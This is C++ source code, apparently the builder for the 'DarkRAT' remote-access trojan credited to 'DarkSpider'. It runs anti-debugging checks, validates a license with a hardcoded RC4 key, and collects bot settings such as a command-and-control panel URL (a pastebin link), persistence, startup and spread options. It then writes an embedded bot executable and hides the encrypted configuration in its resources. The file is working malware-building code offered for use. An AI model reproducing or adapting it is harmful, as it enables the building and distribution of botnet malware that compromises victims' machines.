

#include "stdafx.h"

#include <iostream>
#include <string>
#include <time.h>
#include "antidbg.h"

#include "json.hpp"


#include "rc4.h"
#include "base64.h"
#include "DarkRequest.h"

#include <experimental/filesystem>
#include <fstream>
#include <streambuf>
#include "../../bot/Base64.h"
#include "../../bot/obfuscat.h"

#include "rawclient.h"
#pragma comment(lib,"ws2_32.lib")

struct _target_data* g_pTarget = NULL;
using json = nlohmann::json;

std::string key(size_t length, size_t seed)
{
	srand(seed);
	auto randchar = []() -> char
	{
		const char charset[] =
			"0123456789"
			"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
			"abcdefghijklmnopqrstuvwxyz";
		const size_t max_index = (sizeof(charset) - 1);
		return charset[rand() % max_index];
	};
	std::string str(length, 0);
	std::generate_n(str.begin(), length, randchar);
	return str;
}

void WriteToResources(LPCSTR szTargetPE, int id, LPBYTE lpBytes, DWORD dwSize)
{
	HANDLE hResource = NULL;
	hResource = BeginUpdateResourceA(szTargetPE, FALSE);
	UpdateResource(hResource, RT_RCDATA, MAKEINTRESOURCE(id), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPVOID)lpBytes, dwSize);
	EndUpdateResource(hResource, FALSE);
}



BOOL PortScannerFunc(char* ip, unsigned int port)
{
	char cMsg[1024] = { 0 };
	SOCKET sock;

	int iResult;
	sockaddr_in clientService;
	memset(&clientService, 0x00, sizeof(clientService));
	clientService.sin_family = AF_INET;
	clientService.sin_addr.s_addr = inet_addr(ip);

	sock = INVALID_SOCKET;
	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET)
	{
		printf("Socket return error, code: %d\n", WSAGetLastError());
		closesocket(sock);
		return FALSE;
	}
	clientService.sin_port = htons(port);
	iResult = connect(sock, (SOCKADDR*)& clientService, sizeof(clientService));
	if (iResult != SOCKET_ERROR)
	{
		return TRUE;
	}
	else
	{
			return FALSE;

	}
	return FALSE;
}
std::string ExePath() {
	char buffer[MAX_PATH];
	GetModuleFileName(NULL, buffer, MAX_PATH);
	string::size_type pos = string(buffer).find_last_of("\\/");
	return string(buffer).substr(0, pos);
}

std::string readFile()
{
	stringstream str;
	ifstream stream("darkrat.lic");
	if (stream.is_open())
	{
		while (stream.peek() != EOF)
		{
			str << (char)stream.get();
		}
		stream.close();
		return str.str();
	}
	else {
		return "false";
	}
}

int main(int argc, char* argv[])
{
	adbg_IsDebuggerPresent();
	adbg_IsDebuggerPresent();
	adbg_CheckRemoteDebuggerPresent();
	adbg_BeingDebuggedPEB();
	adbg_NtGlobalFlagPEB();
	adbg_HardwareDebugRegisters();

	adbg_RDTSC();
	adbg_QueryPerformanceCounter();
	adbg_GetTickCount();
	
	RC4 rc4;
	int iResult;
	WSADATA wsaData;
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed: %d\n", iResult);
		return 1;
	}
	std::string ek, pu, gp, bn, ri, per, st, ua;

	/*
		ek = "S#q-}=6{)BuEV[GDeZy>~M5D/P&Q}6>";
		pu = "http://pastebin.com/raw/wJJPteV2";
		gp = "mutesxtest";
		bn = "false";
		ri = "5";
		per = "false";
		st = "spreadtag";
		ua = "SUuqxixibDJVw4XB8";
	*/



	bool exit = false;
	std::string buildSetting;
	std::string user;
	std::string password;

cout << "																		 \n"
"     _______                        __       _______               __			 \n"
"    /       \                      /  |      /       \\             /  |          \n"
"    $$$$$$$  |  ______    ______  $$ |   __ $$$$$$$  |  ______   _$$ |_         \n"
"    $$ |  $$ | /      \\  /      \\ $$ |  /  |$$ |__$$ | /      \\ / $$   |        \n"
"    $$ |  $$ | $$$$$$  |/$$$$$$  |$$ |_/$$/ $$    $$<  $$$$$$  |$$$$$$/         \n"
"    $$ |  $$ | /    $$ |$$ |  $$/ $$   $$<  $$$$$$$  | /    $$ |  $$ | __		 \n"
"    $$ |__$$ |/$$$$$$$ |$$ |      $$$$$$  \\ $$ |  $$ |/$$$$$$$ |  $$ |/  |    	 \n"
"    $$    $$/ $$    $$ |$$ |      $$ | $$  |$$ |  $$ |$$    $$ |  $$  $$/       \n"
"    $$$$$$$/   $$$$$$$/ $$/       $$/   $$/ $$/   $$/  $$$$$$$/    $$$$/        \n"
"																				 \n"
"Created by DarkSpider:	\nXMPP: darkspider@xmpp.jp | Email: darkspiderbots@protonmail.com			\n\n	" << endl;
		std::cout << "Username:"; std::cin >> user;

		std::string license = readFile();
		if (license == "false") {
			return 0;
		}
		
		std::string enckey = OBFUSCATE("S#q-}=6{)BuEV[GDeZy>~M5D/P&Q}6>");
		std::string toDecrypt;
		toDecrypt = rc4.doRC4(base64_decode(license.c_str()), (char*)enckey.c_str());
		char* c_wwrite = &toDecrypt[0u];
		//system("cls");
		nlohmann::json j_config = nlohmann::json::parse(toDecrypt);
		if (j_config["username"] != user) {
			return 0;
		}
		system("cls");
		std::cout << "Welcome Back '"+ user +"'  \n\n";
		std::string conifgjson;

		char c;
		cout << "What would you like to do?\n"
			"  [1] Build from Terminal\n"
			"  [2] Build from Config\n";
		cin >> c;
		switch (toupper(c))
		{
			case '1':
				buildSetting = "terminal";
				system("cls");

			case '2':
				buildSetting = "config";
				system("cls");
		}

		if (buildSetting == "config") {
			std::ifstream t("config.json");
			conifgjson.assign((std::istreambuf_iterator<char>(t)),
				std::istreambuf_iterator<char>());
			
		}
		else {
			std::cout << "Panel Url (EG: 'http://pastebin.com/raw/random') \n OR Direct Encrypted -> "; std::cin >> pu;
			std::cout << "Mutex -> "; std::cin >> gp;
			std::cout << "Startup true/false -> "; std::cin >> bn;
			std::cout << "Persistence true/false -> "; std::cin >> per;
			std::cout << "Request Interval -> "; std::cin >> ri;
			std::cout << "Custom Spread Tag -> "; std::cin >> st;
			std::cout << "User Agent -> "; std::cin >> st;
			std::cout << "Encryption Key -> "; std::cin >> ek;
		}
	



	DWORD Res;
	HANDLE hFile = CreateFile("spider.exe", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (INVALID_HANDLE_VALUE == hFile) {
		return false;
	}
	system("cls");
	std::cout << "Building Bin..\n";
	WriteFile(hFile, rawData, sizeof(rawData), &Res, NULL);
	CloseHandle(hFile);
	Sleep(5000);
	std::cout << "Write Settings.. \n";
	std::string write;
	if (buildSetting == "terminal") {
		json config = {
			{ "ek", ek},
			{ "pu", pu},
			{ "mux", gp},
			{ "sup", bn},
			{ "ri", ri},
			{ "pre", per},
			{ "st", st},
			{ "ua", ua},
			{ "pn", {"FOO", "BAR"}}
		};

		write = config.dump();
	}
	else {
		write = conifgjson;
	}
	//std::cout << write << std::endl;
	write = rc4.doRC4(write, key(32, 0x4d930cf57cfda1ba));
	write = absent::crypto::b64::encode(write.c_str());

	char* c_write = &write[0u];
	//std::cout << write << std::endl;
	WriteToResources("spider.exe", 10, (BYTE *)c_write, strlen(c_write));
	std::cout << "Build Success" << std::endl;
	system("pause");

}
